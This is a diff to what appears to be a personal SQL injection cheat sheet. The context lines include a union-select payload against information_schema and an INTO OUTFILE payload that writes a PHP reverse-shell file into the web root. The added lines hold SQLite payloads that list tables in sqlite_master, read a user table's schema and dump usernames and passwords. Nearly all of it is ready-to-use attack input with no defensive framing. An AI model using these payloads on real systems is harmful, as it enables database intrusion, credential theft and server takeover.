@@ -7,7 +7,9 @@ Basic:
 ```
 <VALUE>' union select 1, table_name FROM information_schema.tables-- -
 ```
-
+```
+sqlite_version()
+```
 > uploading:
 ```
 <VALUE>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY <Sting to Text"php rev shell">#
@@ -32,6 +34,12 @@ Basic:
 3: 
 ```
 12 union select 1,group_concat(message_content),3,4 from messages    
+```
+> INPUT
+```
+(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%')
+(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable')
+(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable)
 ```
 # read files
 1: 
